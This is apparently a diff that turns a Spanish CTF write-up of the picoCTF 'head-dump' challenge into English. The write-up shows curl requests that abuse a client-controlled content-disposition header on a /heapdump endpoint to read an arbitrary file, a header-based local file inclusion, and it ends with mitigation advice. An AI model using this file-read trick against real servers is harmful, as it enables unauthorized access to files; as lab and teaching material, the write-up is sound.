@@ -1,28 +1,26 @@
 # head-dump
 
-## Enunciado
+## Statement
 
 Welcome to the challenge! In this challenge, you will explore a web application and find an endpoint that exposes a file containing a hidden flag.
 
-The application is a simple blog website where you can read articles about various topics, including an article about API Documentation. Your goal is to explore the application and find the endpoint that generates files holding the server’s memory, where a secret flag is hidden.
+The application is a simple blog website where you can read articles about various topics, including an article about API Documentation. Your goal is to explore the application and find the endpoint that generates files holding the server's memory, where a secret flag is hidden.
 
-## Resumen
+## Recon
 
-Lo primero que veo es una web basica de noticias de picoctf
+When I open the website, I see a basic news site about picoCTF:
 
-![[head-dump-01.png]]
+[![Recon](static/head-dump-01.png)
 
-## Solución
+## Find the API docs
 
-### Verificar la documentación de la api
+The API documentation is exposed in the following post on the website:
 
-La documentación de la api esta expuesta en la siguiente publcación:
+![API](static/head-dump-02.png)
 
-![[head-dump-02.png]]
+## Review the API docs
 
-### Revisar la documentación de la api
-
-El nombre del CTF es heapdmp asi que reviso esa ruta de la api:
+The name of the CTF is `head-dump`, and there is a route inside the API documentation, which is a pretty big hint. It contains the following command:
 
 ```bash
 curl -X 'GET' \
@@ -30,28 +28,60 @@ curl -X 'GET' \
   -H 'accept: */*'
 ```
 
-con respuesta:
+With the following response and all the headers the route accepts in the request:
 
 ```
-accept-ranges: bytes cache-control: public,max-age=0  connection: keep-alive  content-disposition: attachment; filename="heapdump-1794260559488.heapsnapshot"  content-length: 11992200  content-type: application/octet-stream  date: Mon,09 Nov 2026 21:42:40 GMT  etag: W/"b6fc88-1a1c2436871"  keep-alive: timeout=5  last-modified: Mon,09 Nov 2026 21:42:39 GMT x-powered-by: Express
+accept-ranges: bytes 
+cache-control: public,max-age=0  
+connection: keep-alive  
+content-disposition: attachment; filename="heapdump-1794260559488.heapsnapshot"  
+content-length: 11992200  
+content-type: application/octet-stream  
+date: Mon,09 Nov 2026 21:42:40 GMT  
+etag: W/"b6fc88-1a1c2436871"  
+keep-alive: timeout=5  
+last-modified: Mon,09 Nov 2026 21:42:39 GMT 
+x-powered-by: Express
 ```
 
-### Extraer la flag
+## Extract the flag
 
-Modifico el comando para que lleve en el header el nombre del archivo que quiero leer `flag` y me lo guardo en un archivo llamado `flag.txt`
+The request accepts a header that references a file, which makes me think I could put another file there and get back whatever files I want without any checks. The header is the following:
 
 ```
-curl -X 'GET' \                                                                               at 22:47:32  
+content-disposition: attachment; filename="heapdump-1794260559488.heapsnapshot" 
+```
+
+In the final request, I replace the file `heapdump-1794260559488.heapsnapshot` with `flag`.
+
+```bash
+curl -X 'GET' \
   'http://xebec.cylabacademy.net:22258/heapdump' \
-  -H 'content-disposition: filename="flag' > flag.txt
+  -H 'content-disposition: attachment; filename="flag"' > flag.txt
 ```
 
-Dentro de `flag.txt` se puede ver en texto claro la flag del reto
+This command can be shortened by removing part of the header:
 
-![[head-dump-03.png]]
+```bash
+curl 'http://xebec.cylabacademy.net:22258/heapdump' -H 'content-disposition: filename="flag' > flag.txt
+```
 
-## Lo aprendido
+I redirect the output to `flag.txt` with `>` so I can analyze it more comfortably and simply.
 
-- Un comentario te puede llevar a una ruta con información "sensible".
-- La documentación de las apis es importante leerla si es accesible por el usuario.
-- Un header en una petición obtenida de una API sin sanitizar puede darte acceso a archivos dentro de la máquina / servidor.
+In the `flag.txt` file, the flag is clearly visible:
+
+![Flag](static/head-dump-03.png)
+
+## Explanation
+
+The API trusts a client-controlled header (`content-disposition`) to decide which file to return, without validating the name. This turns the flaw into a LFI vulnerability, even though it isn't in the URL like in `?page=../../etc/hosts`, which is what is usually looked for.
+
+## What I learned
+
+- An LFI doesn't always live in the URL. A header parameter that decides which file gets served can be just as exploitable.
+- API documentation is first-line recon: in it I found the `/heapdump` endpoint and how to use it.
+- Any value the client sends and the server uses to build paths must be treated as untrusted.
+
+## Mitigation
+
+Don't build filesystem paths with data sent by the client. If a name is needed, use an identifier that the server maps to a known file, or apply `path.basename()` and check the result against an allowlist. Also, the heap dump endpoint should not be exposed in production.
